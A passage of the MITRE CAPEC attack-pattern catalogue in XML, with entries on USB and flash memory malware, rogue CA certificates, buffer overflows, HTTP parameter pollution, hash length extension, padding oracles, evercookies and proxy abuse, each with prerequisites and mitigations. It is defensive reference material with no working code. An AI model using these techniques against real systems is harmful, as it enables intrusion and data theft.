               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Description Summary, Examples-Instances, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">Malicious Logic Insertion into Product Memory</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="457" Name="USB Memory Attacks" Abstraction="Detailed" Status="Draft">
         <Description>An adversary loads malicious code onto a USB memory stick in order to infect any system which the device is plugged in to. USB drives present a significant security risk for business and government agencies. Given the ability to integrate wireless functionality into a USB stick, it is possible to design malware that not only steals confidential data, but sniffs the network, or monitor keystrokes, and then exfiltrates the stolen data off-site via a Wireless connection. Also, viruses can be transmitted via the USB interface without the specific use of a memory stick. The attacks from USB devices are often of such sophistication that experts conclude they are not the work of single individuals, but suggest state sponsorship. These attacks can be performed by an adversary with direct access to a target system or can be executed via means such as USB Drop Attacks.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="456"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="529"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine Target System] In certain cases, the adversary will explore an organization's network to determine a specific target machine to exploit based on the information it contains or privileges the main user may possess.</Description>
               <Technique>If needed, the adversary explores an organization's network to determine if any specific systems of interest exist.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Develop or Obtain malware and install on a USB device] The adversary develops or obtains the malicious software necessary to exploit the target system, which he then installs on an external USB device such as a USB flash drive.</Description>
               <Technique>The adversary can develop or obtain malware for to perform a variety of tasks such as sniffing network traffic or monitoring keystrokes.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Connect or deceive a user into connecting the infected USB device] Once the malware has been placed on an external USB device, the adversary connects the device to the target system or deceives a user into connecting the device to the target system such as in a USB Drop Attack.</Description>
               <Technique>The adversary connects the USB device to a specified target system or performs a USB Drop Attack, hoping a user will find and connect the USB device on his own. Once the device is connected, the malware executes giving the adversary access to network traffic, credentials, etc.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Some level of physical access to the device being attacked.</Prerequisite>
            <Prerequisite>Information pertaining to the target organization on how to best execute a USB Drop Attack.</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>Ensure that proper, physical system access is regulated to prevent an adversary from physically connecting a malicious USB device himself.</Mitigation>
            <Mitigation>Use anti-virus and anti-malware tools which can prevent malware from executing if it finds its way onto a target system. Additionally, make sure these tools are regularly updated to contain up-to-date virus and malware signatures.</Mitigation>
            <Mitigation>Do not connect untrusted USB devices to systems connected on an organizational network. Additionally, use an isolated testing machine to validate untrusted devices and confirm malware does not exist.</Mitigation>
         </Mitigations>
         <References>
            <Reference External_Reference_ID="REF-379"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Description, Description Summary, Related_Attack_Patterns, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="458" Name="Flash Memory Attacks" Abstraction="Detailed" Status="Draft">
         <Description>An attacker inserts malicious logic into a product or technology via flashing the on-board memory with a code-base that contains malicious logic. Various attacks exist against the integrity of flash memory, the most direct being rootkits coded into the BIOS or chipset of a device. Such attacks are very difficult to detect because the malicious code resides outside the filesystem or RAM, and in the underlying byte-code that drives the processor. Many devices, such as the recent attacks against digital picture frames, contain only a microprocessor and a small amount of solid-state memory, rendering these devices ideal for "flash" based malware or malicious logic. One of the pernicious characteristics of flash memory based attacks is that the malicious code can survive even a total format of the hard-drive and reinstallation of the host operating system. Virtually any device which can be integrated into a computer system is susceptible to these attacks. Additionally, any peripheral device which interfaces with the computer bus could extract or sniff confidential data, even on systems employing full-disk encryption. Trojan code placed into a video card's chipset would continue to perform its function irrespective of the host operating system, and would be invisible to all known antivirus. The threats extend to consumer products such as camcorders, digital cameras, or any consumer electronic device with an embedded microcontroller.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="456"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-379"/>
            <Reference External_Reference_ID="REF-394"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="459" Name="Creating a Rogue Certification Authority Certificate" Abstraction="Detailed" Status="Draft">
         <Description>An adversary exploits a weakness in the MD5 hash algorithm (weak collision resistance) to generate a certificate signing request (CSR) that contains collision blocks in the "to be signed" part. The adversary specially crafts two different, but valid X.509 certificates that when hashed with the MD5 algorithm would yield the same value. The adversary then sends the CSR for one of the certificates to the Certification Authority which uses the MD5 hashing algorithm. That request is completely valid and the Certificate Authority issues an X.509 certificate to the adversary which is signed with its private key. An adversary then takes that signed blob and inserts it into another X.509 certificate that the attacker generated. Due to the MD5 collision, both certificates, though different, hash to the same value and so the signed blob works just as well in the second certificate. The net effect is that the adversary's second X.509 certificate, which the Certification Authority has never seen, is now signed and validated by that Certification Authority. To make the attack more interesting, the second certificate could be not just a regular certificate, but rather itself a signing certificate. Thus the adversary is able to start their own Certification Authority that is anchored in its root of trust in the legitimate Certification Authority that has signed the attackers' first X.509 certificate. If the original Certificate Authority was accepted by default by browsers, so will now the Certificate Authority set up by the adversary and of course any certificates that it signs. So the adversary is now able to generate any SSL certificates to impersonate any web server, and the user's browser will not issue any warning to the victim. This can be used to compromise HTTPS communications and other types of systems where PKI and X.509 certificates may be used (e.g., VPN, IPSec).</Description>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="473"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Certification Authority is using the MD5 hash function to generate the certificate hash to be signed</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Understanding of how to force an MD5 hash collision in X.509 certificates</Skill>
            <Skill Level="High">An attacker must be able to craft two X.509 certificates that produce the same MD5 hash</Skill>
            <Skill Level="Medium">Knowledge needed to set up a certification authority</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>Certification Authorities need to stop using the weak collision prone MD5 hashing algorithm to hash the certificates that they are about to sign. Instead they should be using stronger hashing functions such as SHA-256 or SHA-512.</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="327"/>
            <Related_Weakness CWE_ID="295"/>
            <Related_Weakness CWE_ID="290"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1130</Entry_ID>
               <Entry_Name>Install Root Certificate</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-395"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Creating a Rogue Certificate Authority Certificate</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="46" Name="Overflow Variables and Tags" Abstraction="Detailed" Status="Draft">
         <Description>This type of attack leverages the use of tags or variables from a formatted configuration data to cause buffer overflow. The attacker crafts a malicious HTML page or configuration file that includes oversized strings, thus causing an overflow.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
            <Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="8"/>
            <Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="10"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Experiment</Phase>
               <Description>The attacker modifies a tag or variable from a formatted configuration data. For instance she changes it to an oversized string.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>The target program consumes the data modified by the attacker without prior boundary checking. As a consequence, a buffer overflow occurs and at worst remote code execution may follow.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target program consumes user-controllable data in the form of tags or variables.</Prerequisite>
            <Prerequisite>The target program does not perform sufficient boundary checking.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.</Skill>
            <Skill Level="High">Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Use a language or compiler that performs automatic bounds checking.</Mitigation>
            <Mitigation>Use an abstraction library to abstract away risky APIs. Not a complete solution.</Mitigation>
            <Mitigation>Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.</Mitigation>
            <Mitigation>Use OS-level preventative functionality. Not a complete solution.</Mitigation>
            <Mitigation>Do not trust input data from user. Validate all user input.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Overflow Variables and Tags in MidiPlug</xhtml:div>
               <xhtml:p>A buffer overflow vulnerability exists in the Yamaha MidiPlug that can be accessed via a Text variable found in an EMBED tag.</xhtml:p>See also: CVE-1999-0946</Example>
            <Example>
               <xhtml:div style="color:#32498D; font-weight:bold;">Attack Example: Overflow Variables and Tags in Exim</xhtml:div>
               <xhtml:p>A buffer overflow in Exim allows local users to gain root privileges by providing a long :include: option in a .forward file.</xhtml:p>See also: CVE-1999-0971</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="118"/>
            <Related_Weakness CWE_ID="119"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="680"/>
            <Related_Weakness CWE_ID="733"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="460" Name="HTTP Parameter Pollution (HPP)" Abstraction="Detailed" Status="Draft">
         <Description>An attacker overrides or adds HTTP GET/POST parameters by injecting query string delimiters. Via HPP it may be possible to override existing hardcoded HTTP parameters, modify the application behaviors, access and, potentially exploit, uncontrollable variables, and bypass input validation checkpoints and WAF rules.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="15"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>HTTP protocol is used with some GET/POST parameters passed</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Any tool that enables intercepting and tampering with HTTP requests</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Configuration: If using a Web Application Firewall (WAF), filters should be carefully configured to detect abnormal HTTP requests</xhtml:p>
               <xhtml:p>Design: Perform URL encoding</xhtml:p>
               <xhtml:p>Implementation: Use strict regular expressions in URL rewriting</xhtml:p>
               <xhtml:p>Implementation: Beware of multiple occurrences of a parameter in a Query String</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="88"/>
            <Related_Weakness CWE_ID="147"/>
            <Related_Weakness CWE_ID="235"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-397"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="461" Name="Web Services API Signature Forgery Leveraging Hash Function Extension Weakness" Abstraction="Standard" Status="Draft">
         <Description>When web services require callees to authenticate, they sometimes issue a token / secret to the caller that the caller is to use to sign their web service calls. In one such scheme the caller when constructing a request would concatenate all of the parameters passed to the web service with the provided authentication token and then generate a hash of the concatenated string (e.g., MD5, SHA1, etc.). That hash then forms the signature that is passed to the web service which is used on the server side to verify the origin authenticity and integrity of the message. There is a practical attack against an authentication scheme of this nature that makes use of the hash function extension / padding weakness. Leveraging this weakness, an attacker, who does not know the secret token, is able to modify the parameters passed to the web service by generating their own call and still generate a legitimate signature hash. For instance, consider the message to be passed to the web service is M (this message includes the parameters passed to the web service concatenated with the secret token / key bytes). The message M is hashed and that hash is passed to the web service and is used for authentication. The attacker does not know M, but can see Hash (M) and Length (M). The attacker can then compute Hash (M || Padding (M) || M') for any M'. The attacker does not know the entire message M, specifically the attacker does not know the secret bytes, but that does not matter. The attacker is still able to sign their own message M' and make the called web service verify the integrity of the message without an error. Because of the iterative design of the hash function, it is possible, from only the hash of a message and its length, to compute the hash of longer messages that start with the initial message and include the padding required for the initial message to reach a multiple of 512 bits. It is important to note that the attack not limited to MD5 and will work just as well with another hash function like SHA1.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="115"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Web services check the signature of the API calls</Prerequisite>
            <Prerequisite>Authentication tokens / secrets are shared between the server and the legitimate client</Prerequisite>
            <Prerequisite>The API call signature is generated by concatenating the parameter list with the shared secret and hashing the result.</Prerequisite>
            <Prerequisite>An iterative hash function like MD5 and SHA1 is used.</Prerequisite>
            <Prerequisite>An attacker is able to intercept or in some other way gain access to the information passed between the legitimate client and the server in order to retrieve the hash value and length of the original message.</Prerequisite>
            <Prerequisite>The communication channel between the client and the server is not secured via channel security such as TLS</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Medium level of cryptography knowledge, specifically how iterative hash functions work. This is needed to select proper padding.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>
               <xhtml:p>Access to a function to produce a hash (e.g., MD5, SHA1)</xhtml:p>
               <xhtml:p>Tools that allow the attacker to intercept a message between the client and the server, specifically the hash that is the signature and the length of the original message concatenated with the secret bytes</xhtml:p>
            </Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>Design: Use a secure message authentication code (MAC) function such as an HMAC-SHA1</Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="328"/>
            <Related_Weakness CWE_ID="290"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-398"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="462" Name="Cross-Domain Search Timing" Abstraction="Detailed" Status="Draft">
         <Description>An attacker initiates cross domain HTTP / GET requests and times the server responses. The timing of these responses may leak important information on what is happening on the server. Browser's same origin policy prevents the attacker from directly reading the server responses (in the absence of any other weaknesses), but does not prevent the attacker from timing the responses to requests that the attacker issued cross domain. For GET requests an attacker could for instance leverage the "img" tag in conjunction with "onload() / onerror()" javascript events. For the POST requests, an attacker could leverage the "iframe" element and leverage the "onload()" event. There is nothing in the current browser security model that prevents an attacker to use these methods to time responses to the attackers' cross domain requests. The timing for these responses leaks information. For instance, if a victim has an active session with their online e-mail account, an attacker could issue search requests in the victim's mailbox. While the attacker is not able to view the responses, based on the timings of the responses, the attacker could ask yes / no questions as to the content of victim's e-mails, who the victim e-mailed, when, etc. This is but one example; There are other scenarios where an attacker could infer potentially sensitive information from cross domain requests by timing the responses while asking the right questions that leak information.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="54"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Ability to issue GET / POST requests cross domainJava Script is enabled in the victim's browserThe victim has an active session with the site from which the attacker would like to receive informationThe victim's site does not protect search functionality with cross site request forgery (CSRF) protection</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Some knowledge of Java Script</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to issue GET / POST requests cross domain</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Design: The victim's site could protect all potentially sensitive functionality (e.g. search functions) with cross site request forgery (CSRF) protection and not perform any work on behalf of forged requests</xhtml:p>
               <xhtml:p>Design: The browser's security model could be fixed to not leak timing information for cross domain requests</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="385"/>
            <Related_Weakness CWE_ID="352"/>
            <Related_Weakness CWE_ID="208"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-399"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="463" Name="Padding Oracle Crypto Attack" Abstraction="Detailed" Status="Draft">
         <Description>An adversary is able to efficiently decrypt data without knowing the decryption key if a target system leaks data on whether or not a padding error happened while decrypting the ciphertext. A target system that leaks this type of information becomes the padding oracle and an adversary is able to make use of that oracle to efficiently decrypt data without knowing the decryption key by issuing on average 128*b calls to the padding oracle (where b is the number of bytes in the ciphertext block). In addition to performing decryption, an adversary is also able to produce valid ciphertexts (i.e., perform encryption) by using the padding oracle, all without knowing the encryption key. Any cryptosystem can be vulnerable to padding oracle attacks if the encrypted messages are not authenticated to ensure their validity prior to decryption, and then the information about padding error is leaked to the adversary. This attack technique may be used, for instance, to break CAPTCHA systems or decrypt/modify state information stored in client side objects (e.g., hidden fields or cookies). This attack technique is a side-channel attack on the cryptosystem that uses a data leak from an improperly implemented decryption routine to completely subvert the cryptosystem. The one bit of information that tells the adversary whether a padding error during decryption has occurred, in whatever form it comes, is sufficient for the adversary to break the cryptosystem. That bit of information can come in a form of an explicit error message about a padding error, a returned blank page, or even the server taking longer to respond (a timing attack). This attack can be launched cross domain where an adversary is able to use cross-domain information leaks to get the bits of information from the padding oracle from a target system / service with which the victim is communicating. To do so an adversary sends a request containing ciphertext to the target system. Due to the browser's same origin policy, the adversary is not able to see the response directly, but can use cross-domain information leak techniques to still get the information needed (i.e., information on whether or not a padding error has occurred). For instance, this can be done using "img" tag plus the onerror()/onload() events. The adversary's JavaScript can make web browsers to load an image on the target site, and know if the image is loaded or not. This is 1-bit information needed for the padding oracle attack to work: if the image is loaded, then it is valid padding, otherwise it is not.</Description>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="97"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The decryption routine does not properly authenticate the message / does not verify its integrity prior to performing the decryption operation</Prerequisite>
            <Prerequisite>The target system leaks data (in some way) on whether a padding error has occurred when attempting to decrypt the ciphertext.</Prerequisite>
            <Prerequisite>The padding oracle remains available for enough time / for as many requests as needed for the adversary to decrypt the ciphertext.</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>
               <xhtml:p>Ability to detect instances where a target system is vulnerable to an oracle padding attack</xhtml:p>
               <xhtml:p>Sufficient cryptography knowledge and tools needed to take advantage of the presence of the padding oracle to perform decryption / encryption of data without a key</xhtml:p>
            </Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Design: Use a message authentication code (MAC) or another mechanism to perform verification of message authenticity / integrity prior to decryption</xhtml:p>
               <xhtml:p>Implementation: Do not leak information back to the user as to any cryptography (e.g., padding) encountered during decryption.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="209"/>
            <Related_Weakness CWE_ID="514"/>
            <Related_Weakness CWE_ID="649"/>
            <Related_Weakness CWE_ID="347"/>
            <Related_Weakness CWE_ID="354"/>
            <Related_Weakness CWE_ID="696"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-400"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="464" Name="Evercookie" Abstraction="Standard" Status="Draft">
         <Description>An attacker creates a very persistent cookie that stays present even after the user thinks it has been removed. The cookie is stored on the victim's machine in over ten places to include: Standard HTTP Cookies, Local Shared Objects (Flash Cookies), Silverlight Isolated Storage, Storing cookies in RGB values of auto-generated, force-cached, PNGs using HTML5 Canvas tag to read pixels (cookies) back out, Storing cookies in Web History, Storing cookies in HTTP ETags, Storing cookies in Web cache, window.name caching, Internet Explorer userData storage, HTML5 Session Storage, HTML5 Local Storage, HTML5 Global Storage, HTML5 Database Storage via SQLite, among others. When the victim clears the cookie cache via traditional means inside the browser, that operation removes the cookie from certain places but not others. The malicious code then replicates the cookie from all of the places where it was not deleted to all of the possible storage locations once again. So the victim again has the cookie in all of the original storage locations. In other words, failure to delete the cookie in even one location will result in the cookie's resurrection everywhere. The evercookie will also persist across different browsers because certain stores (e.g., Local Shared Objects) are shared between different browsers.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="554"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The victim's browser is not configured to reject all cookiesThe victim visits a website that serves the attackers' evercookie</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Evercookie source code</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Design: Browser's design needs to be changed to limit where cookies can be stored on the client side and provide an option to clear these cookies in all places, as well as another option to stop these cookies from being written in the first place.</xhtml:p>
               <xhtml:p>Design: Safari browser's private browsing mode is currently effective against evercookies.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="359"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-401"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Description Summary, Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="465" Name="Transparent Proxy Abuse" Abstraction="Detailed" Status="Draft">
         <Description>A transparent proxy serves as an intermediate between the client and the internet at large. It intercepts all requests originating from the client and forwards them to the correct location. The proxy also intercepts all responses to the client and forwards these to the client. All of this is done in a manner transparent to the client. Transparent proxies are often used by enterprises and ISPs. For requests originating at the client transparent proxies need to figure out the final destination of the client's data packet. Two ways are available to do that: either by looking at the layer three (network) IP address or by examining layer seven (application) HTTP header destination. A browser has same origin policy that typically prevents scripts coming from one domain initiating requests to other websites from which they did not come. To circumvent that, however, malicious Flash or an Applet that is executing in the user's browser can attempt to create a cross-domain socket connection from the client to the remote domain. The transparent proxy will examine the HTTP header of the request and direct it to the remote site thereby partially bypassing the browser's same origin policy. This can happen if the transparent proxy uses the HTTP host header information for addressing rather than the IP address information at the network layer. This attack allows malicious scripts inside the victim's browser to issue cross-domain requests to any hosts accessible to the transparent proxy.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="554"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Transparent proxy is usedVulnerable configuration of network topology involving the transparent proxy (e.g., no NAT happening between the client and the proxy)Execution of malicious Flash or Applet in the victim's browser</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Creating malicious Flash or Applet to open a cross-domain socket connection to a remote system</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Design: Ensure that the transparent proxy uses an actual network layer IP address for routing requests. On the transparent proxy, disable the use of routing based on address information in the HTTP host header.</xhtml:p>
               <xhtml:p>Configuration: Disable in the browser the execution of Java Script, Flash, SilverLight, etc.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="441"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-402"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
